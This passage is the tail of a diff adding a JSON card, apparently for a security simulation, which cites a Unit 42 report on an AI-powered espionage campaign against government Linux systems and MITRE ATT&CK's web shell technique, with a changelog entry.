+      "title": "Unit 42 - AI-Powered Espionage Campaign Targets Government Linux Infrastructure (CL-UNK-1211)",
+      "url": "https://unit42.paloaltonetworks.com/ai-campaign-targets-linux-infrastructure/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "published_date": "2026-10-15",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK - T1505.003 Server Software Component: Web Shell",
+      "url": "https://attack.mitre.org/techniques/T1505/003/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "1.0.0",
+      "date": "2026-10-27",
+      "author": "Henry Reed",
+      "change": "Initial card for SIM-MP-024 (library signal expansion, chain 2)."
+    }
+  ]
+}
